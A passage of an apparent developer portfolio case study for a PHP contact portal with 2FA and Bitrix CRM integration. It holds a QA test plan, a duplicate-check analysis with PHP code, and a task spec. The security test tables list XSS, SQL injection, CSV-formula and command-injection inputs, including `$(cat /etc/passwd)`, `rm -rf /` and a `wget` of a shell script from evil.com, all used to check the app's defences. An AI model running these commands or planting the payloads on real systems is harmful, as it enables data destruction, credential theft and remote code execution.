| FORM-02 | Submission without active authentication | Lose the session by clearing cookies, then try to submit the form | Submission fails, the JSON response says `The authentication session has expired...`, and `form_errors` contains `CONTACT_CREATE_AUTH_REQUIRED` |
| FORM-03 | Form unavailable in `2fa_pending` state | Start 2FA and attempt to submit the form without completing authentication | Access to the form is not granted until 2FA is complete |
| FORM-04 | POST to `/contact/process.php` with an invalid form ID | Send a POST request with `tildaspec-formid=test123` | JSON: `form not found` |

###### 6.2. Form Field Validation

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| FORM-05 | DaData autofill by taxpayer identification number | Enter `1234567890` in the company name/taxpayer identification number field | A suggestion containing the company name appears. When selected, all hidden or readonly form fields (taxpayer identification number, tax registration reason code, primary state registration number, address, economic activity code, and others) are populated automatically |
| FORM-06 | Autofill by a specific company name | Begin entering a specific company name corresponding to taxpayer identification number 1234567890 | The correct company appears in the DaData suggestions, and its fields are populated correctly after selection |
| FORM-07 | Successful submission of an autofilled form | Fill the form through DaData, complete any remaining required fields such as phone and email, then submit it | Server-side validation succeeds and the JSON response says `The form was submitted successfully.` |

###### 6.3. Submission to Bitrix CRM (Without a Mock)

> **Precondition:** `bitrix_mock_mode = false` in `config.php`.

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| FORM-17 | Successful submission to Bitrix | Complete and submit the form with valid data | JSON: `The form was submitted successfully.` plus an `Open in Bitrix CRM: ID XXXXX` link; `bitrix_data` contains a record with the form data and company ID |
| FORM-18 | Response contains a CRM link | Inspect the JSON after a successful submission | It contains an HTML link in the format `https://crm.example.com/crm/company/details/XXXXX/` |
| FORM-19 | Bitrix REST API error | Temporarily replace `bitrix_rest_api_url` with an invalid URL | The JSON error says `Unable to create the company in Bitrix CRM. Please try again later.`, and `form_errors` contains `BITRIX_ERROR` |
| FORM-20 | Empty Bitrix REST API URL | Temporarily clear `bitrix_rest_api_url` | The JSON error says `Unable to create the company...`, and `form_errors` contains `BITRIX_ERROR` with `bitrix_rest_api_url_not_configured` |
| FORM-21 | Submission notification email | Submit the form with valid data | An email is delivered to the addresses in `form_notification_emails` (default: `recipient@example.com`) |
| FORM-22 | SMTP failure while sending the notification | Replace the SMTP host and submit the form | The Bitrix request still runs because email does not block the primary flow, but `form_errors` contains `FORM_NOTIFICATION_EMAIL_FAIL` |
| FORM-23 | Bitrix field mapping | Inspect the company created in Bitrix | All fields (`TITLE`, taxpayer identification number, tax registration reason code, primary state registration number, economic activity code, and address) are mapped correctly according to `contactBitrixGetFieldMap()` |

###### 6.4. `/contact/create` Form Rate Limit

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| FORM-24 | Form rate limit exceeded | Submit more than 10 requests from one IP within 1 hour | Honey-pot JSON: `Your request has been submitted; please wait to be contacted`, and `form_errors` contains `RATE_LIMIT` |
| FORM-25 | Rate-limit response is disguised as success | Inspect the JSON response after exceeding the limit | The response format is `{\"message\": \"...\"}`, not `{\"error\": \"...\"}`, following the honey-pot pattern |

---

##### 7. Security and Vulnerabilities

###### 7.1. XSS (Cross-Site Scripting)

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| SEC-XSS-01 | XSS in the login form username | Enter `<script>alert(1)</script>` as the username | The script does not execute, the text is escaped through `contactLoginEscape`, and the “Invalid username or password” error appears |
| SEC-XSS-02 | XSS in a `/contact/create` form field | Enter `<script>alert(1)</script>` in the `company` field | The JSON response says `The request was submitted...` as a honey pot, and `form_errors` contains `SECURITY_INJECTION` with type `XSS` |
| SEC-XSS-03 | XSS through an `<iframe>` tag | Enter `<iframe src="...">` in a form field | The injection is detected and a honey-pot response is returned |
| SEC-XSS-04 | XSS through an `onload` event | Enter `<img src=x onerror=alert(1)>` | The injection is detected |
| SEC-XSS-05 | XSS through `javascript:` | Enter `javascript:alert(1)` in any field | The injection is detected |
| SEC-XSS-06 | Security alert email for XSS | Enter an XSS payload in a create-form field | An email is delivered to the addresses in `security_alert_emails` and contains the IP, field, and threat type |

###### 7.2. SQL Injection

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| SEC-SQL-01 | SQLi in the username field | Enter `admin' OR '1'='1` | The “Invalid username or password” error appears; no SQL is involved because the database is file-based |
| SEC-SQL-02 | SQLi in a create-form field | Enter `'; DROP TABLE users; --` in the `company` field | A honey-pot response is returned, and `form_errors` contains `SECURITY_INJECTION` with type `SQLi` |
| SEC-SQL-03 | `UNION SELECT` | Enter `UNION SELECT * FROM users` | The injection is detected |
| SEC-SQL-04 | URL-encoded SQLi | Enter `%27%20OR%201%3D1`, the URL-encoded form of `' OR 1=1` | The injection is detected by checking the decoded version through `urldecode + html_entity_decode` |

###### 7.3. Command Injection

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| SEC-CMD-01 | Command injection in a form field | Enter `$(cat /etc/passwd)` | A honey-pot response is returned with `SECURITY_INJECTION` type `CmdExec` |
| SEC-CMD-02 | Backticks | Enter `` `rm -rf /` `` | The injection is detected |
| SEC-CMD-03 | wget/curl injection | Enter `wget http://evil.com/shell.sh` | The injection is detected |

###### 7.4. CSV Injection

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| SEC-CSV-01 | CSV injection through `=` | Enter a username or form-field value beginning with `=CMD("calc")` | The CSV remains intact: `contactCsvLoggerSanitizeValue` escapes the value and protects leading `=`, `+`, `-`, and `@` characters |
| SEC-CSV-02 | CSV injection through `+` | Enter `+cmd|'/C calc'!A0` | The value is written safely to the CSV file |
| SEC-CSV-03 | CSV injection through `-` | Enter `-1+1+cmd|'/C calc'!A0` | The value is written safely |
| SEC-CSV-04 | CSV injection through `@` | Enter `@SUM(A1:A2)` | The value is written safely |
| SEC-CSV-05 | Line breaks in a log value | Enter a value containing `\r\n` | The CSV rows remain intact and the line breaks are removed |
| SEC-CSV-06 | `;` delimiter in a value | Enter a value containing a semicolon | `fputcsv` escapes the CSV value correctly and the columns remain intact |


###### 7.5. Other Attacks

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| SEC-MISC-01 | Password brute force | Submit POST requests with different passwords | After 5 attempts, the IP is blocked for 30 minutes |
| SEC-MISC-02 | 2FA code brute force | Try different 6-digit codes | After 5 incorrect codes, `2FA_MAX_ATTEMPTS` is recorded and the session is reset |
| SEC-MISC-03 | Replay attack using a 2FA code | Reuse the code after a successful login | The code is removed from the session after its first successful use |
| SEC-MISC-04 | Spoofed proxy headers | Send a request containing a forged `X-Forwarded-For: 1.2.3.4` header | `FILTER_FLAG_NO_PRIV_RANGE` and `FILTER_FLAG_NO_RES_RANGE` checks cause private IP addresses from proxy headers to be ignored |
| SEC-MISC-05 | Session fixation | Supply a known session ID before authentication | `session_regenerate_id(true)` is called after successful login, so the old ID no longer works |
| SEC-MISC-06 | Path traversal to `users.json` | Try `../login/users.json`, `./login/users.json`, and similar paths | Access is denied through `.htaccess` |
| SEC-MISC-07 | Direct access to `contact/login/sessions/` | Open the `contact/login/sessions/` URL | 403 Forbidden |

---

##### 8. Logs and Technical Checks

###### 8.1. Authentication Log `auth_YYYY-MM.csv`

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| LOG-AUTH-01 | Authentication log structure | Perform 1 successful and 1 unsuccessful login attempt | `auth_YYYY-MM.csv` contains: `Date and time`, `IP address`, `User-Agent`, `Username`, and `Result` |
| LOG-AUTH-02 | ISO 8601 date format | Inspect the date field | The format is `2026-04-07T15:18:14+03:00` in Moscow time |
| LOG-AUTH-03 | Status coverage — SUCCESS | Sign in successfully | `SUCCESS` |
| LOG-AUTH-04 | Status coverage — FAIL_PASSWORD | Enter an incorrect password | `FAIL_PASSWORD` |
| LOG-AUTH-05 | Status coverage — FAIL_USER_NOT_FOUND | Enter a nonexistent username | `FAIL_USER_NOT_FOUND` |
| LOG-AUTH-06 | Status coverage — BLOCKED | Retry after the IP is blocked | `BLOCKED` |
| LOG-AUTH-07 | Status coverage — FAIL_CAPTCHA_MISSING | Send a POST request without `smart-token` | `FAIL_CAPTCHA_MISSING` |
| LOG-AUTH-08 | Status coverage — FAIL_CAPTCHA_INVALID | Submit an invalid CAPTCHA token | `FAIL_CAPTCHA_INVALID` |
| LOG-AUTH-09 | Status coverage — FAIL_CAPTCHA_ERROR | Trigger a CAPTCHA API error | `FAIL_CAPTCHA_ERROR` |
| LOG-AUTH-10 | Status coverage — 2FA_EMAIL_SENT | Send the initial 2FA code | `2FA_EMAIL_SENT` |
| LOG-AUTH-11 | Status coverage — 2FA_EMAIL_RESENT | Resend the code | `2FA_EMAIL_RESENT` |
| LOG-AUTH-12 | Status coverage — 2FA_EMAIL_SUCCESS | Enter the correct 2FA code | `2FA_EMAIL_SUCCESS` and `SUCCESS` in the same request |
| LOG-AUTH-13 | Status coverage — 2FA_EMAIL_FAIL | Enter an incorrect 2FA code | `2FA_EMAIL_FAIL` |
| LOG-AUTH-14 | Status coverage — 2FA_TIMEOUT | Let the code expire | `2FA_TIMEOUT` |
| LOG-AUTH-15 | Status coverage — 2FA_MAX_ATTEMPTS | Exceed the incorrect-code limit | `2FA_MAX_ATTEMPTS` |
| LOG-AUTH-16 | Unknown status is not logged | Attempt to call `logAuthAttempt` with an arbitrary status through a code-level check | No record is created; in debug mode, the error is written to `error_log` |
| LOG-AUTH-17 | `;` delimiter | Open the CSV file in a text editor | Values are separated by semicolons |
| LOG-AUTH-18 | BOM marker on file creation | Create an empty log file by removing the current one, then perform a login attempt | The file begins with a BOM (UTF-8 BOM: `\xEF\xBB\xBF`) |

###### 8.2. Attack Log `attacks_YYYY-MM.csv`

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| LOG-ATK-01 | Attack log structure | Trigger an IP block | `attacks_YYYY-MM.csv` contains: `Start time`, `IP`, `UA`, `Usernames`, `Attempts`, `Blocked until`, and `Headers` |
| LOG-ATK-02 | List of attempted usernames | Make unsuccessful attempts with different usernames | The `Usernames` field contains a comma-separated list of unique usernames |
| LOG-ATK-03 | Correct User-Agent | Inspect the `UA` field | It contains the browser's actual User-Agent |
| LOG-ATK-04 | Proxy headers | Trigger a block | The `Headers` field contains JSON with `CF-Connecting-IP`, `X-Forwarded-For`, and similar values, or `-` when no proxy is present |
| LOG-ATK-05 | No duplicate records | After blocking, submit more requests from the blocked IP | No new row appears in `attacks`; no duplicate is created because `just_blocked` is `false` |
| LOG-ATK-06 | Block expiration time | Inspect the `Blocked until` field | The value is in ISO 8601 format and is 30 minutes after `Start time` |

###### 8.3. Bitrix Data Log `bitrix_data_YYYY-MM.csv`

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| LOG-BIT-01 | Bitrix data log structure | Submit the `/contact/create` form | `bitrix_data_YYYY-MM.csv` contains: `Date`, `User`, `IP`, `Company`, `Taxpayer identification number`, `Tax registration reason code`, `Primary state registration number`, `Economic activity code`, `Address`, `JSON data`, `Bitrix ID`, and `Bitrix response` |
| LOG-BIT-02 | Username in the log | Submit the form as an authenticated user | The `User` column equals `$_SESSION['username']` |
| LOG-BIT-03 | JSON containing all form data | Inspect the `JSON data` column | It contains JSON with every form field |
| LOG-BIT-04 | Bitrix ID after successful submission | Submit data successfully to Bitrix | The `Bitrix ID` column contains a numeric value |
| LOG-BIT-05 | Bitrix response after an error | Trigger a Bitrix API error | The `Bitrix response` column contains a JSON response with `error` |
| LOG-BIT-06 | Bitrix ID generated in mock mode | Submit the form in mock mode | `Bitrix ID` is a random 6-digit number |

###### 8.4. Form Error Log `form_errors_YYYY-MM.csv`

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| LOG-ERR-01 | Form error log structure | Trigger an error by submitting without authentication | `form_errors_YYYY-MM.csv` contains: `Date`, `IP`, `Type`, `Message`, and `JSON context` |
| LOG-ERR-02 | CONTACT_CREATE_AUTH_REQUIRED type | Send a POST request to `/contact/process.php` without authentication | Type = `CONTACT_CREATE_AUTH_REQUIRED` |
| LOG-ERR-03 | RATE_LIMIT type | Exceed the form rate limit | Type = `RATE_LIMIT` |
| LOG-ERR-04 | SECURITY_INJECTION type | Submit the form with an XSS payload | Type = `SECURITY_INJECTION`; the context contains the threat type, IP, field, and payload |
| LOG-ERR-05 | VALIDATION_ERROR type | Submit the form with invalid fields | Type = `VALIDATION_ERROR`; the context contains a list of errors |
| LOG-ERR-06 | BITRIX_ERROR type | Trigger a Bitrix error | Type = `BITRIX_ERROR`; the context contains the API response |
| LOG-ERR-07 | FORM_NOTIFICATION_EMAIL_FAIL type | Replace the SMTP settings and submit the form | Type = `FORM_NOTIFICATION_EMAIL_FAIL` |
| LOG-ERR-08 | Valid JSON context | Open the log and copy the `JSON context` value | The JSON parses correctly and contains structured data |

###### 8.5. General Log Checks

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| LOG-GEN-01 | Monthly file rotation | Inspect the log file names | The names follow the `*_YYYY-MM.csv` pattern |
| LOG-GEN-02 | CSV log security | Submit login or form values containing special characters, line breaks, or a leading `=`, `+`, `-`, or `@` | CSV rows and columns remain intact, and the content remains legible and safe |
| LOG-GEN-03 | Logs inaccessible from the browser | Try to open `contact/login/logs/auth_2026-04.csv` | 403 Forbidden |
| LOG-GEN-04 | Shared CSV helper | Verify that all logs use `contactCsvLoggerAppendMonthlyRow` | One shared write mechanism, sanitization process, and rotation process are used |
| LOG-GEN-05 | UTF-8 encoding with BOM | Inspect any log in a hex editor | The file begins with BOM `EF BB BF` and uses UTF-8 encoding |
| LOG-GEN-06 | Concurrent write (`flock`) | Submit requests simultaneously from 2 tabs | Both events are written without corrupting the log because of the `flock(LOCK_EX)` file lock |

---

##### 9. UI/UX Checks

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| UI-01 | Login button behavior | Hover over the primary buttons on the login and 2FA page | Hover feedback is restrained, without abrupt color shifts or visual noise |
| UI-02 | Login form responsiveness | Open `/contact/login/` on a mobile device under 480 px wide | The form remains legible and no elements extend beyond the viewport |
| UI-03 | `Sign out` button state | Inspect the `Sign out` button on `/contact/create` | Its `href` points to `/contact/login/logout.php` |
| UI-04 | CAPTCHA widget | Open the login form and complete the CAPTCHA | The widget does not obscure form elements and works correctly |
| UI-05 | Error message after PRG | Enter an incorrect password | The page reloads through PRG, the error message is visible, and pressing F5 does not resubmit the form |

---

##### Recommended Execution Order

1. **Login form fields** (LOGIN-01 … LOGIN-11): verify that basic validation works.
2. **Access and authentication** (AUTH-01 … AUTH-13): verify the primary sign-in and sign-out flow.
3. **CAPTCHA** (CAPTCHA-01 … CAPTCHA-09): verify the Yandex SmartCaptcha integration.
4. **Rate limiting** (RATE-01 … RATE-08): verify IP blocking.
5. **Email 2FA** (2FA-01 … 2FA-20): run the complete two-factor authentication flow.
6. **Protected form** (FORM-01 … FORM-25): verify access, validation, submission, and rate limiting.
7. **Security** (SEC-*): verify protection against injections and CSV injection.
8. **Logs** (LOG-*): verify the contents of all four log types.
9. **UI/UX** (UI-01 … UI-05): perform visual checks.

:::

## 5. Completed QA Report <Badge type="tip" text="DOCX" />

<div class="case-download-card">
  <div class="case-download-card__icon" aria-hidden="true">QA</div>
  <div class="case-download-card__body">
    <strong>QA Report · Contact Create · Pass</strong>
    <span>Completed manual QA report with test execution results</span>
  </div>
  <a class="case-download-card__action" href="/cv/files/contact-create-page/QA_Report_Contact_Create_Pass.docx" download>Download DOCX</a>
</div>

## 6. Duplicate Check Analysis <Badge type="info" text="Analysis" />



::: details 🔍 Open the Full Duplicate Analysis

<div class="case-source-path"><span>Source</span><code>.tasks/done/001-duplicate-check/analysis.md</code></div>

#### Checking for Duplicate Companies in Bitrix CRM

##### Verdict: Feasible, Low-to-Medium Complexity

The task is **fully feasible** with the current API and project architecture. The webhook already used for `crm.company.add` also supports other REST API methods, including search and filtering.

---

##### 1. What the Project Already Has

###### Current Company Creation Flow

```text
create.php form
        ↓
process.php
        ↓
Validation and security checks
        ↓
Email notification
        ↓
crm.company.add in Bitrix
        ↓
Success response or error
```

###### Key Elements

| Component | File | Purpose |
|-----------|------|------------|
| Webhook URL | `config.php` | `https://crm.example.com/rest/.../` |
| Field mapping | `bitrix_company.php` | POST fields → Bitrix CRM fields |
| Company creation | `bitrix_company.php` | `contactCreateBitrixCompany()` |
| Form handler | `process.php` | Bitrix call + result processing |

###### Form Fields Available for Duplicate Searches

| Form field | Bitrix field | Uniqueness | Search reliability |
|------------|-------------|:---:|:---:|
| `inn` | `UF_CRM_INN` | ✅ Unique for legal entities | ⭐⭐⭐ Best option |
| `ogrn` | `UF_CRM_OGRN` | ✅ Unique | ⭐⭐⭐ Best option |
| `company` | `TITLE` | ❌ May be repeated | ⭐⭐ Supplemental |
| `kpp` | `UF_CRM_KPP` | ⚠️ Unique when paired with the TIN | ⭐ Auxiliary |

---

##### 2. Available Bitrix REST API Methods

###### Method 1: `crm.company.list` (⭐ Recommended)

Allows companies to be searched by **any field**, including custom fields (UF_CRM_*).

```http
GET /rest/.../crm.company.list?
    filter[UF_CRM_INN]=1234567890
    &select[]=ID
    &select[]=TITLE
    &select[]=UF_CRM_INN
```

> **💡 Recommendation.** This is the **best option** for this project because the form collects the TIN and PSRN—unique identifiers for legal entities. An exact TIN match means a guaranteed duplicate.

###### Method 2: `crm.duplicate.findbycomm`

Searches for duplicates by **phone number or email address**.

```http
GET /rest/.../crm.duplicate.findbycomm?
    entity_type=COMPANY
    &type=PHONE
    &values[]=+7XXXXXXXXXX
```

> **⚠️ Limitation.** This method is **not suitable as the primary method** because the `contact/create` form **does not collect a company phone number or email address**. However, if these fields are added in the future, it can be used as an additional check.

###### Method 3: `crm.company.list` by Name (Fuzzy)

Searches by a partial name match:

```http
GET /rest/.../crm.company.list?
    filter[%TITLE]=Rostelecom
    &select[]=ID
    &select[]=TITLE
```

> **ℹ️ Note.** Useful as an **additional** check, but unreliable because of naming variations ("Rostelecom LLC" vs "LLC Rostelecom" vs "PJSC Rostelecom").

---

##### 3. Recommended Strategy

###### Combined Check Before `crm.company.add`

```text
Form data received
        ↓
TIN provided?
├── Yes → crm.company.list by TIN ───┐
└── No  → crm.company.list by TITLE ─┤
                                      ↓
                              Companies found?
                              ├── No  → crm.company.add
                              └── Yes → Warning + duplicate list
                                         ├── Confirm → crm.company.add
                                         └── Cancel
```

###### Two Operating Modes

**Mode A — Blocking (Strict):**
- If a duplicate is found by TIN → **prevent** creation and show a link to the existing company
- Simple to implement but inflexible

**Mode B — Warning (Recommended):**
- If a duplicate is found → **show a warning** with a list of similar companies
- The user decides whether to create a new company or open an existing one
- Requires an AJAX request before form submission

---

##### 4. Implementation Example (PHP)

###### New Duplicate Search Function

Add this to `bitrix_company.php`:

```php
/**
 * Searches for existing companies in Bitrix CRM by TIN and/or name.
 *
 * @param array $formData form data
 * @return array ['found' => bool, 'companies' => [...]]
 */
function contactFindDuplicateCompanies(array $formData) {
    $config = function_exists('contactLoginGetConfig')
        ? contactLoginGetConfig()
        : require dirname(__DIR__) . '/config.php';

    $apiUrl = rtrim((string) ($config['bitrix_rest_api_url'] ?? ''), '/');
    $isMockMode = !empty($config['bitrix_mock_mode']);

    if ($apiUrl === '') {
        return ['found' => false, 'companies' => [], 'error' => 'api_not_configured'];
    }

    // Priority 1: search by TIN (exact match)
    $inn = contactBitrixGetFormFieldValue($formData, 'inn');

    if ($inn !== '') {
        $result = contactBitrixSearchCompanyByField($apiUrl, 'UF_CRM_INN', $inn, $isMockMode);

        if (!empty($result['companies'])) {
            return $result;
        }
    }

    // Priority 2: search by name (partial match)
    $title = contactBitrixGetFormFieldValue($formData, 'company');

    if ($title !== '') {
        return contactBitrixSearchCompanyByField($apiUrl, '%TITLE', $title, $isMockMode);
    }

    return ['found' => false, 'companies' => []];
}

/**
 * Searches for a company by a single field through crm.company.list.
 */
function contactBitrixSearchCompanyByField($apiUrl, $fieldName, $value, $isMockMode = false) {
    if ($isMockMode) {
        return ['found' => false, 'companies' => [], 'is_mock' => true];
    }

    $requestUrl = $apiUrl . '/crm.company.list?'
        . 'filter[' . urlencode($fieldName) . ']=' . urlencode($value)
        . '&select[]=ID&select[]=TITLE&select[]=UF_CRM_INN';

    $httpContext = stream_context_create([
        'http' => [
            'method'  => 'GET',
            'timeout' => 10,
            'ignore_errors' => true,
        ],
    ]);

    $responseRaw = @file_get_contents($requestUrl, false, $httpContext);

    if ($responseRaw === false) {
        return ['found' => false, 'companies' => [], 'error' => 'request_failed'];
    }

    $decoded = json_decode($responseRaw, true);
    $companies = is_array($decoded) && isset($decoded['result']) ? $decoded['result'] : [];

    return [
        'found'     => count($companies) > 0,
        'companies' => $companies,
    ];
}
```

###### Integration into process.php

Insert this **before** the `contactCreateBitrixCompany()` call on `line 296`:

```php
// Check for duplicates before creating the company
$duplicateResult = contactFindDuplicateCompanies($sanitizedPost);

if (!empty($duplicateResult['found'])) {
    $duplicateList = [];

    foreach ($duplicateResult['companies'] as $company) {
        $companyId = (string) ($company['ID'] ?? '');
        $companyTitle = htmlspecialchars((string) ($company['TITLE'] ?? ''), ENT_QUOTES, 'UTF-8');
        $companyUrl = 'https://crm.example.com/crm/company/details/' . $companyId . '/';

        $duplicateList[] = "<a href='" . $companyUrl . "' target='_blank'>"
            . $companyTitle . " (ID " . $companyId . ")</a>";
    }

    response([
        'error' => 'Possible duplicate! Similar companies were found in the CRM:<br><br>'
            . implode('<br>', $duplicateList)
            . '<br><br>If you are sure, select "Create despite duplicates".',
    ]);
}
```

###### Optional AJAX Endpoint (Mode B)

If a live check is needed while the form is being completed:

```php
// /contact/check-duplicate.php
require_once __DIR__ . '/login/init.php';
require_once __DIR__ . '/login/lib/bitrix_company.php';

header('Content-Type: application/json; charset=utf-8');

if (!contactLoginIsAuthenticated()) {
    echo json_encode(['error' => 'auth_required']);
    exit;
}

$inn = isset($_GET['inn']) ? trim((string) $_GET['inn']) : '';

if ($inn === '' || !preg_match('/^\d{10,12}$/', $inn)) {
    echo json_encode(['found' => false, 'companies' => []]);
    exit;
}

$result = contactFindDuplicateCompanies(['inn' => $inn]);
echo json_encode($result, JSON_UNESCAPED_UNICODE);
```

---

##### 5. Effort Estimate

| Option | Complexity | Time | Description |
|---------|:---------:|:-----:|----------|
| **A. Blocking check** | 🟢 Low | ~2-3 hours | Add a check in `process.php` before `crm.company.add`. If the TIN matches, return an error with a link |
| **B. Warning + confirmation** | 🟡 Medium | ~4-6 hours | Option A + a “create despite duplicates” checkbox + an AJAX check when the TIN is entered |
| **C. Full integration (live search)** | 🟠 Medium+ | ~8-12 hours | Option B + autocomplete when entering the company name + display of the duplicate card |

###### What Is Already Complete and Requires No Changes

- ✅ The webhook URL is configured and working
- ✅ The form field → Bitrix mapping is already implemented
- ✅ The HTTP client (through `file_get_contents`) is already in use
- ✅ Authentication and rate limiting are already in place
- ✅ The JSON response format is standardized

###### What Needs to Be Added

- 📝 The `contactFindDuplicateCompanies()` function in `bitrix_company.php`
- 📝 A check call in `process.php` (3-5 lines)
- 📝 *(optional)* A frontend JS handler for the live check
- 📝 *(optional)* A separate `check-duplicate.php` endpoint

---

##### 6. Potential Risks and Limitations

> **⚠️ Bitrix REST API rate limits.** The webhook is limited to **2 requests per second** (the standard Bitrix24 limit). Each duplicate check adds one request before creation. This is **not a problem** under the current load, but it should be taken into account.

> **ℹ️ Mock mode.** The configuration currently has `bitrix_mock_mode = true`. In mock mode, the duplicate check can safely be skipped (returning `found: false`), which is already handled in the code example above.

> **❗ Custom fields (`UF_CRM_*`).** The TIN search uses the custom `UF_CRM_INN` field. If its ID changes on the Bitrix side, the duplicate search will stop working. However, the same risk already exists for `crm.company.add`, so this is not a new issue.

---

##### Summary

**The task is straightforward.** All the infrastructure required for implementation is already present in the project. A minimum viable version (blocking by TIN) can be completed in **2-3 hours**—literally one new function plus 5 lines in the handler. I recommend starting with Option A (blocking check by TIN), then extending it to warning-based Option B if necessary.

:::

## 7. TIN-Based Duplicate Check Implementation <Badge type="tip" text="Complete" />



::: details 🛠️ Open the TIN-Based Implementation Task

<div class="case-source-path"><span>Source</span><code>.tasks/done/001-duplicate-check/task.md</code></div>

#### [001] Checking for Duplicate Companies by TIN in Bitrix CRM

> **Objective:** When a company is selected from DaData, automatically check whether that company already exists in Bitrix CRM by TIN. If a duplicate is found, show a warning with the ID and a link to the company. The check runs in real time (AJAX) without reloading the page.

##### Solution Architecture

| Step | Participant | Action / response |
|:---:|---|---|
| 1 | User → Form | Starts entering the company name |
| 2 | Form → DaData API | Sends a Suggestions API request |
| 3 | DaData API → Form | Returns a list of suggestions |
| 4 | User → Form | Selects a company from the list |
| 5 | Form | DaData fills the TIN, PSRN, KPP, and other hidden fields |
| 6 | Form | `onSelect` obtains the TIN and disables the button with the text “Checking...” |
| 7 | Form → Endpoint | Sends an AJAX GET request to `/contact/check-duplicate.php?inn=1234567890` |
| 8 | Endpoint | Checks authentication |
| 9 | Endpoint → Bitrix REST API | Requests `crm.company.list` with a TIN filter |
| 10 | Bitrix REST API → Endpoint | Returns JSON: found / not found |
| 11 | Endpoint → Form | Returns `{found: true/false, companies: [...]}` |
| 12A | Form · duplicate found | Shows a warning; the button remains disabled |
| 12B | Form · no duplicate found | Removes the warning and enables the button |

##### Tasks

###### Backend

- ⬜ **1.1** Create a TIN-based duplicate search function in `bitrix_company.php`
  - New function: `contactFindDuplicateByInn(string $inn): array`
  - Uses the Bitrix REST API method `crm.company.list` with a filter on the custom TIN field (`UF_CRM_INN`)
  - Requests the fields `ID`, `TITLE`, and `UF_CRM_INN` (TIN)
  - HTTP request timeout: **5 seconds** (shorter than the standard 10 seconds to avoid slowing down the UI)
  - In mock mode (`bitrix_mock_mode = true`), always returns `found: false`
  - Response format:
    ```php
    [
        'found'     => bool,
        'companies' => [['ID' => '12345', 'TITLE' => 'Horns and Hooves LLC', 'UF_CRM_INN' => '1234567890']],
        'error'     => null | 'request_failed' | 'api_not_configured',
        'is_mock'   => bool,
    ]
    ```

- ⬜ **1.2** Create the AJAX endpoint `contact/check-duplicate.php`
  - Accepts: `GET ?inn=XXXXXXXXXX`
  - Authentication check: `contactLoginIsAuthenticated()`—if authentication fails → `{"error": "auth_required"}`
  - TIN validation: digits only, 10 or 12 characters (`/^\d{10}(\d{2})?$/`)
  - If the TIN is invalid → `{"found": false, "companies": []}`
  - Calls `contactFindDuplicateByInn($inn)`
  - On a successful search, returns an array of matched companies with the following fields:
    - `id`—the Bitrix company ID
    - `title`—the company name
    - `inn`—the company TIN
    - `url`—a direct link to the company record: `https://crm.example.com/crm/company/details/{ID}/`
  - Headers: `Content-Type: application/json; charset=utf-8`
  - `no-cache` headers to prevent the browser from caching the response

- ⬜ **1.3** Register the `/contact/check-duplicate.php` route
  - In `router.php`, add the `'/contact/check-duplicate.php'` case
  - Add the path to the `$dynamicPhpRoutes` array
  - In the root `.htaccess`, add `RewriteRule ^contact/check-duplicate\.php$ contact/check-duplicate.php [NC,L]`

###### Frontend

- ⬜ **1.4** Add an AJAX duplicate check to the DaData `onSelect` callback
  - In `create.php` (DaData block, around line 2226, `onSelect` function), add a call to the new `checkDuplicateByInn(inn)` function **after** the hidden fields are populated
  - The `checkDuplicateByInn(inn)` function:
    1. If `inn` is empty or does not match the `/^\d{10,12}$/` regular expression, do not send a request; exit
    2. Disable the “Submit” button: `submitBtn.disabled = true`, text → `"Checking..."`
    3. Hide the previous warning, if any
    4. Run `fetch('/contact/check-duplicate.php?inn=' + encodeURIComponent(inn))`
    5. Set an **8-second frontend timeout** (using `AbortController`). If the request does not complete, show a “Skip check” button
    6. When a response is received:
       - If `found === true`, show a yellow warning block; the button remains disabled
       - If `found === false`, remove the warning and enable the button
       - If a network error or timeout occurs, enable the button (do not block work because the check failed) and show an unobtrusive notification

- ⬜ **1.5** Create the duplicate warning block
  - The HTML container `<div id="duplicate-warning">` is inserted **above** the company search field (before `<div class="t-input-group" data-input-lid="INPUT_ID">`)
  - Warning styles:
    - Background: `#FFF3CD` (yellow, like Bootstrap `alert-warning`)
    - Border: `1px solid #FFEEBA`
    - Rounded corners: `border-radius: 4px`
    - A ⚠️ icon on the left
    - Text: **“This company has already been added to Bitrix CRM”**
    - Below the text: the **company ID** and a **clickable link** to the record (opens in a new tab)
    - The record link is styled as a link button (blue, underlined text)
    - Entrance animation: smooth downward expansion (`max-height` transition, ~300ms)
    - A `×` close button (only removes the warning from the UI and enables the “Submit” button—this supports a deliberate attempt to add a duplicate)
  - When the warning is hidden using `×`, enable the “Submit” button (the user is consciously ignoring the warning)
  - Visual example:
    ```
    ┌──────────────────────────────────────────────────────┐
    │ ⚠️ This company is already in Bitrix CRM         [×] │
    │                                                      │
    │    Company: Rostelecom LLC                           │
    │    ID: 12345                                         │
    │    🔗 Open the record in CRM                         │
    └──────────────────────────────────────────────────────┘
    ```

- ⬜ **1.6** Handle a stalled check (protection against slow requests)
  - If the AJAX request takes longer than **8 seconds**:
    1. Cancel the request through `AbortController.abort()`
    2. Show a gray information block instead of the yellow one: *“Duplicate checking is unavailable. You can continue without checking.”*
    3. Enable the “Submit” button to allow normal operation to continue
  - If a network error occurs (`fetch` is rejected, but not because of a timeout), handle it similarly: do not block the user and show an unobtrusive message
  - **Principle:** Duplicate checking is an optional enhancement. It must **never** completely block the form workflow

- ⬜ **1.7** Remove the warning when the form is reset
  - After successful form submission, hide the `#duplicate-warning` block together with `form.reset()`
  - When the “Company name” field is changed manually (new input), hide the warning block
  - When new input begins in the DaData field (before the next `onSelect`), hide the old warning

###### Protection and Security

- ⬜ **1.8** Server-side validation in `check-duplicate.php`
  - The TIN must contain digits only and be 10 or 12 characters long. Otherwise → `{"found": false}`
  - Authentication is mandatory. An unauthenticated request → `{"error": "auth_required"}`
  - No rate limit is required (the check is tied to user actions and constrained by the UX flow, while the Bitrix API already has a limit of 2 rps)

##### Files

| Action  | File                                          |
|-----------|-----------------------------------------------|
| Modify  | `contact/login/lib/bitrix_company.php`        |
